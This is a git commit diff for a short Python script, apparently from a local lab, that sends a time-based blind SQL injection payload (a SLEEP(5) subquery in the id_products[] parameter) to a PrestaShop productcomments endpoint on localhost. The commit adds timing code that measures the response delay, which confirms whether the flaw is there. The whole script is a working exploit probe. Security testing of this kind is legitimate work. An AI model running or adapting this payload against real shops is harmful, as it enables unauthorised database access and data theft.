efd69bdd2d325245a2e8cb07886eeaea69c79808
ayaxsantos <ayax.asantos@gmail.com>
2021-10-28 18:19:39 -0300

    Fix calculo de tiempo

--- src/script.py
+++ src/script.py
@@ -1,10 +1,18 @@
 import sys
 import requests
-import time
+from datetime import datetime
+
 
 def funcionPrincipal():
+    t1=datetime.now()
+
     r =  requests.get("http://localhost/prestashop_si/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(5)))xoOt)")
     print(r.content)
+    
+    t2=datetime.now()
+    duration=t2-t1
+
+    print(round(duration.total_seconds(),2),"segundos demora")
 
 if __name__ == "__main__":
     funcionPrincipal()
